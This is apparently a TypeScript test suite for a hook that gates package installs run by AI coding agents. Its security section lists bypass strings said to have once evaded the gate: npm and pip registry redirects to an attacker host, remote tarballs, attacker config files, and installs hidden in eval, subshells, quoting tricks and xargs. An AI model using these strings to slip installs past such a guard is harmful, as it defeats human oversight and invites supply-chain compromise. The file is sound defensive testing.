import { describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  parseInstallCommand,
  decideBashGate,
  extractCommandFromHookPayload,
} from "./install-gate.js";
import type { GateDeps } from "./triage-gate.js";
import type { TriageType } from "./triage.js";

describe("extractCommandFromHookPayload — per-agent wire shapes", () => {
  it("reads tool_input.command (Claude/Codex/Amazon Q/Gemini)", () => {
    assert.equal(
      extractCommandFromHookPayload({ tool_name: "Bash", tool_input: { command: "npm i x" } }),
      "npm i x",
    );
  });
  it("reads top-level command (Cursor beforeShellExecution)", () => {
    assert.equal(extractCommandFromHookPayload({ command: "pip install y" }), "pip install y");
  });
  it("reads preToolUse.parameters.command (Cline PreToolUse)", () => {
    assert.equal(
      extractCommandFromHookPayload({
        hookName: "PreToolUse",
        preToolUse: { toolName: "execute_command", parameters: { command: "npm install z" } },
      }),
      "npm install z",
    );
  });
  it("reads toolCall.args.CommandLine (Antigravity run_command)", () => {
    assert.equal(
      extractCommandFromHookPayload({
        toolCall: { name: "run_command", args: { CommandLine: "npm install evil" } },
      }),
      "npm install evil",
    );
  });
  it("reads arguments.command (Amp permissions delegate)", () => {
    assert.equal(
      extractCommandFromHookPayload({ tool: "Bash", arguments: { command: "pip install evil" } }),
      "pip install evil",
    );
  });
  it("joins array-form (bin + args)", () => {
    assert.equal(
      extractCommandFromHookPayload({ tool_input: { command: ["npm", "install", "z"] } }),
      "npm install z",
    );
  });
  it("returns '' when no command present (→ gate allows)", () => {
    assert.equal(extractCommandFromHookPayload({ preToolUse: { toolName: "read_file" } }), "");
    assert.equal(extractCommandFromHookPayload({}), "");
    assert.equal(extractCommandFromHookPayload(null), "");
  });
});

describe("parseInstallCommand — detection", () => {
  const refs = (cmd: string) => parseInstallCommand(cmd).refs;

  it("npm install / i / add → npm refs", () => {
    assert.deepEqual(refs("npm install express"), ["npm:express"]);
    assert.deepEqual(refs("npm i express"), ["npm:express"]);
    assert.deepEqual(refs("npm add express"), ["npm:express"]);
  });

  it("skips flags (npm i -g typescript)", () => {
    assert.deepEqual(refs("npm i -g typescript"), ["npm:typescript"]);
    assert.deepEqual(refs("npm install --save-dev jest"), ["npm:jest"]);
  });

  it("pnpm / yarn / bun add", () => {
    assert.deepEqual(refs("pnpm add react react-dom"), ["npm:react", "npm:react-dom"]);
    assert.deepEqual(refs("yarn add lodash@4.17.21"), ["npm:lodash"]); // version stripped
    assert.deepEqual(refs("bun add zod"), ["npm:zod"]);
  });

  it("scoped packages keep the scope, drop the version", () => {
    assert.deepEqual(refs("npm install @modelcontextprotocol/sdk@1.2.3"), [
      "npm:@modelcontextprotocol/sdk",
    ]);
  });

  it("npx / bunx execution is gated (first non-flag token)", () => {
    assert.deepEqual(refs("npx create-react-app"), ["npm:create-react-app"]);
    assert.deepEqual(refs("npx -y cowsay"), ["npm:cowsay"]);
    assert.deepEqual(refs("bunx vite"), ["npm:vite"]);
  });

  it("pip / pip3 / pipx / uv / python -m pip", () => {
    assert.deepEqual(refs("pip install requests"), ["pip:requests"]);
    assert.deepEqual(refs("pip3 install Flask>=2.0"), ["pip:Flask"]); // version spec stripped
    assert.deepEqual(refs("pipx install black"), ["pip:black"]);
    assert.deepEqual(refs("uv add httpx"), ["pip:httpx"]);
    assert.deepEqual(refs("uv pip install numpy"), ["pip:numpy"]);
    assert.deepEqual(refs("python -m pip install pandas"), ["pip:pandas"]);
    assert.deepEqual(refs("python3 -m pip install scipy"), ["pip:scipy"]);
  });

  it("pip extras keep just the name", () => {
    assert.deepEqual(refs("pip install 'requests[security]'".replace(/'/g, "")), ["pip:requests"]);
  });

  it("bare reinstall (no package args) is NOT an install", () => {
    assert.equal(parseInstallCommand("npm install").isInstall, false);
    assert.equal(parseInstallCommand("yarn").isInstall, false);
    assert.equal(parseInstallCommand("pnpm install").isInstall, false);
    assert.equal(parseInstallCommand("npm ci").isInstall, false);
  });

  it("local targets are ignored (user's own code)", () => {
    assert.deepEqual(parseInstallCommand("npm i ./local-pkg").refs, []);
    assert.deepEqual(parseInstallCommand("pip install -e .").refs, []);
    assert.deepEqual(parseInstallCommand("pip install ./dist/foo.whl").refs, []);
    assert.deepEqual(parseInstallCommand("npm i ../sibling").refs, []);
  });

  it("chained commands gate every install", () => {
    const p = parseInstallCommand("npm i a && pip install b ; npx c");
    assert.deepEqual(p.refs.sort(), ["npm:a", "npm:c", "pip:b"]);
  });

  it("dedups repeated targets", () => {
    assert.deepEqual(refs("npm i express express"), ["npm:express"]);
  });

  it("out-of-scope ecosystems pass through (not flagged)", () => {
    assert.equal(parseInstallCommand("cargo add serde").isInstall, false);
    assert.equal(parseInstallCommand("go install x@latest").isInstall, false);
    assert.equal(parseInstallCommand("gem install rails").isInstall, false);
    assert.equal(parseInstallCommand("brew install jq").isInstall, false);
  });

  it("non-install commands are ignored", () => {
    assert.equal(parseInstallCommand("git status").isInstall, false);
    assert.equal(parseInstallCommand("ls -la && echo hi").isInstall, false);
    assert.equal(parseInstallCommand("npm run build").isInstall, false);
    assert.equal(parseInstallCommand("npm test").isInstall, false);
  });

  it("fail-closed: an in-scope install with an unreducible target is unverifiable", () => {
    const p = parseInstallCommand("npm install git+https://github.com/evil/pkg");
    assert.equal(p.isInstall, true);
    assert.equal(p.refs.length, 0);
    assert.equal(p.unverifiable.length, 1);
  });

  it("handles empty / garbage input", () => {
    assert.equal(parseInstallCommand("").isInstall, false);
    // @ts-expect-error intentional bad input
    assert.equal(parseInstallCommand(undefined).isInstall, false);
  });
});

// Adversarial bypasses found in the deep security pass — each defeated every
// matcher before the fix and let an untriaged install through. Regression-locked.
describe("parseInstallCommand — bypass resistance (security)", () => {
  it("CRIT-1: a leading env-var assignment does not hide the install", () => {
    // `A=1 npm i evil` tokenized to t[0]="A=1" → no matcher fired → ALLOWED.
    assert.deepEqual(parseInstallCommand("A=1 npm i evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("FOO=bar BAZ=2 pip install evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("env X=1 npm i evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("sudo npm i evil").refs, ["npm:evil"]);
  });

  it("CRIT-REGISTRY: a registry/index redirect is fail-closed (triage-PASS-while-installing-evil bypass)", () => {
    // env-var redirects → the triaged NAME isn't what installs
    for (const cmd of [
      "npm_config_registry=http://attacker.evil/ npm i lodash",
      "NPM_CONFIG_REGISTRY=http://attacker.evil/ npm i lodash",
      "PIP_INDEX_URL=http://attacker.evil/ pip install requests",
      "PIP_EXTRA_INDEX_URL=http://attacker.evil/ pip install requests",
      "UV_INDEX_URL=http://attacker.evil/ pip install requests",
    ]) {
      const p = parseInstallCommand(cmd);
      assert.equal(p.isInstall, true, cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
        `must be unverifiable: ${cmd}`,
      );
    }
    // flag-form redirects (equals and separate value), npm + pip
    for (const cmd of [
      "npm i lodash --registry=http://attacker.evil/",
      "npm i lodash --registry http://attacker.evil/",
      "pip install requests -i http://attacker.evil/",
      "pip install requests --index-url http://attacker.evil/",
    ]) {
      const p = parseInstallCommand(cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
        `must be unverifiable: ${cmd}`,
      );
    }
    // indirect + less-obvious redirect vectors (2nd red-team pass)
    for (const cmd of [
      "YARN_NPM_REGISTRY_SERVER=http://attacker.evil/ yarn add lodash", // yarn berry
      "NPM_CONFIG_USERCONFIG=/tmp/evil.npmrc npm i lodash", // attacker .npmrc
      "NPM_CONFIG_GLOBALCONFIG=/tmp/evil.npmrc npm i lodash",
      "PIP_CONFIG_FILE=/tmp/evil.conf pip install requests", // attacker pip.conf
      "env 'npm_config_@scope:registry=http://attacker.evil/' npm i @scope/pkg", // scoped
    ]) {
      const p = parseInstallCommand(cmd);
      assert.ok(
        p.unverifiable.some((u) => u.startsWith("alt-registry:")),
        `must be unverifiable: ${cmd}`,
      );
    }
  });

  it("CRIT-REGISTRY: a special-char env assignment can't hide the install entirely", () => {
    // `env 'a:b=1' npm i evil` left `a:b=1` as argv[0] before the broadened strip,
    // so NO matcher fired and the install was fully undetected (worst case).
    assert.deepEqual(parseInstallCommand("env 'a:b=1' npm i evil".replace(/'/g, "")).refs, [
      "npm:evil",
    ]);
    assert.equal(parseInstallCommand("a:b=1 npm i evil").isInstall, true);
  });

  it("CRIT-REGISTRY: the canonical public registry/index is NOT flagged (no false-positive)", () => {
    assert.deepEqual(
      parseInstallCommand("npm_config_registry=https://registry.npmjs.org npm i lodash").refs,
      ["npm:lodash"],
    );
    assert.deepEqual(
      parseInstallCommand("npm_config_registry=https://registry.npmjs.org npm i lodash")
        .unverifiable,
      [],
    );
    assert.deepEqual(
      parseInstallCommand("pip install requests -i https://pypi.org/simple").unverifiable,
      [],
    );
  });

  it("HIGH-SHELL: leading shell keywords / grouping / eval don't hide the install", () => {
    assert.deepEqual(parseInstallCommand("if true; then npm i evil; fi").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("then npm i evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("{ npm i evil ; }").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("for x in 1; do pip install evil; done").refs, [
      "pip:evil",
    ]);
    assert.deepEqual(parseInstallCommand("eval 'npm i evil'").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('eval "pip install evil"').refs, ["pip:evil"]);
  });

  it("HIGH-BG: an install after a background `&` / `|&` is still detected", () => {
    assert.deepEqual(parseInstallCommand(": & npm i evil".replace(/:/, "echo hi")).refs, [
      "npm:evil",
    ]);
    assert.deepEqual(parseInstallCommand("echo hi & npm install evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("true |& npm i evil").refs, ["npm:evil"]);
  });

  it("CRIT-2: package runners (npm exec / pnpm dlx / yarn dlx / bun x) are gated", () => {
    assert.deepEqual(parseInstallCommand("npm exec evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("pnpm dlx evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("yarn dlx evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("bun x evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("pnpm exec evil").refs, ["npm:evil"]);
  });

  it("CRIT-3: a remote tarball URL is unverifiable (fail-closed), not 'local'", () => {
    const p = parseInstallCommand("npm install https://evil.example/pkg.tgz");
    assert.equal(p.isInstall, true);
    assert.deepEqual(p.refs, []);
    assert.equal(p.unverifiable.length, 1, "remote .tgz must NOT be dropped as a local target");
    // a genuinely local tarball/wheel path is still ignored
    assert.deepEqual(parseInstallCommand("pip install ./dist/foo.whl").refs, []);
    assert.deepEqual(parseInstallCommand("npm i ./pkg.tgz").refs, []);
  });

  it("HIGH-1: an install hidden in a subshell / -c arg is still detected", () => {
    assert.deepEqual(parseInstallCommand("sh -c 'npm i evil'").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('bash -c "pip install evil"').refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("echo $(npm i evil)").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("x=`pip install evil`").refs, ["pip:evil"]);
  });

  it("quoted package names are handled (no false-positive block)", () => {
    assert.deepEqual(parseInstallCommand("npm i 'express'").refs, ["npm:express"]);
    assert.deepEqual(parseInstallCommand('npm i "lodash@4"').refs, ["npm:lodash"]);
  });
});

describe("parseInstallCommand — sweep hardening (bypass closes)", () => {
  const gated = (cmd: string) => {
    const p = parseInstallCommand(cmd);
    return p.isInstall && (p.refs.length > 0 || p.unverifiable.length > 0);
  };

  it("intra-word quoting no longer hides the binary/subcommand", () => {
    assert.deepEqual(parseInstallCommand('n"p"m install evil').refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('npm i"nstall" evil').refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("np'm' i evil").refs, ["npm:evil"]);
  });

  it("path- and backslash-qualified package managers are matched (basename)", () => {
    assert.deepEqual(parseInstallCommand("/usr/bin/npm install evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("./node_modules/.bin/pnpm add evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("\\npm install evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("/usr/bin/sudo /usr/bin/npm i evil").refs, ["npm:evil"]);
  });

  it("process substitution and here-strings are recursed", () => {
    assert.deepEqual(parseInstallCommand("cat <(npm install evil)").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("diff <(npm i evil) /dev/null").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand('bash <<< "npm i evil"').refs, ["npm:evil"]);
  });

  it("fetch-and-run verbs are covered (init/create/uvx/uv tool/pipx run/npm x)", () => {
    assert.deepEqual(parseInstallCommand("npm init evil").refs, ["npm:create-evil"]);
    assert.deepEqual(parseInstallCommand("npm create evil").refs, ["npm:create-evil"]);
    assert.deepEqual(parseInstallCommand("yarn create evil").refs, ["npm:create-evil"]);
    assert.deepEqual(parseInstallCommand("npm x evil").refs, ["npm:evil"]);
    assert.deepEqual(parseInstallCommand("uvx evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("uv tool install evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("uv tool run evil").refs, ["pip:evil"]);
    assert.deepEqual(parseInstallCommand("pipx run evil").refs, ["pip:evil"]);
  });

  it("builtin wrapper is stripped", () => {
    assert.deepEqual(parseInstallCommand("builtin npm i evil").refs, ["npm:evil"]);
  });

  it("xargs-stdin and $VAR-indirected installs fail closed (unverifiable)", () => {
    const x = parseInstallCommand("echo evil | xargs npm i");
    assert.equal(x.isInstall, true);
    assert.ok(x.unverifiable.includes("xargs-stdin-install"));
    const v = parseInstallCommand("PM=npm; $PM install evil");
    assert.equal(v.isInstall, true);
    assert.ok(v.unverifiable.some((u) => u.startsWith("indirect-bin:")));
    assert.ok(gated("echo evil | xargs npm i") && gated("PM=npm; $PM install evil"));
  });

  it("does NOT over-trigger: comments, requirement files, and runner args", () => {
    // trailing comment stripped — only the real package is triaged, no bogus refs
    assert.deepEqual(parseInstallCommand("npm i react # installs react").refs, ["npm:react"]);
    // -r/-e file operands are not packages
    const r = parseInstallCommand("pip install -r requirements.txt");
    assert.deepEqual(r.refs, []);
    assert.deepEqual(r.unverifiable, []);
    // a runner's trailing args are NOT packages (only the fetched tool is)
    assert.deepEqual(parseInstallCommand("npx cowsay moo").refs, ["npm:cowsay"]);
    assert.deepEqual(parseInstallCommand("npm create vite myapp").refs, ["npm:create-vite"]);
  });
});

// Fake triage: pass everything except names in `blocklist`.
function fakeDeps(blocklist: string[] = []): GateDeps {
  return {
    runTriage: async (type: TriageType, target: string) => ({
      type,
      target,
      passed: !blocklist.includes(target),
      output: blocklist.includes(target) ? "TRIAGE FAILED" : "TRIAGE PASSED",
    }),
  };
}

describe("decideBashGate — decision", () => {
  it("allows a non-install command without triaging", async () => {
    const v = await decideBashGate("git status", fakeDeps());
    assert.equal(v.block, false);
    assert.equal(v.checked.length, 0);
  });

  it("allows when every target triages PASS", async () => {
    const v = await decideBashGate("npm i express && pip install requests", fakeDeps());
    assert.equal(v.block, false);
    assert.equal(v.checked.length, 2);
  });

  it("BLOCKS when any target fails triage (fail-closed)", async () => {
    const v = await decideBashGate("npm i express evil-pkg", fakeDeps(["evil-pkg"]));
    assert.equal(v.block, true);
    assert.match(v.reason, /triage did not pass|evil-pkg/);
  });

  it("BLOCKS an unverifiable in-scope install without calling triage", async () => {
    let called = false;
    const deps: GateDeps = {
      runTriage: async (type, target) => {
        called = true;
        return { type, target, passed: true, output: "" };
      },
    };
    const v = await decideBashGate("npm install git+https://github.com/x/y", deps);
    assert.equal(v.block, true);
    assert.equal(called, false, "must not triage when target is unverifiable — block outright");
    assert.match(v.reason, /cannot reduce to a triage target/);
  });

  it("local-only install neither blocks nor triages", async () => {
    const v = await decideBashGate("pip install -e .", fakeDeps());
    assert.equal(v.block, false);
  });
});
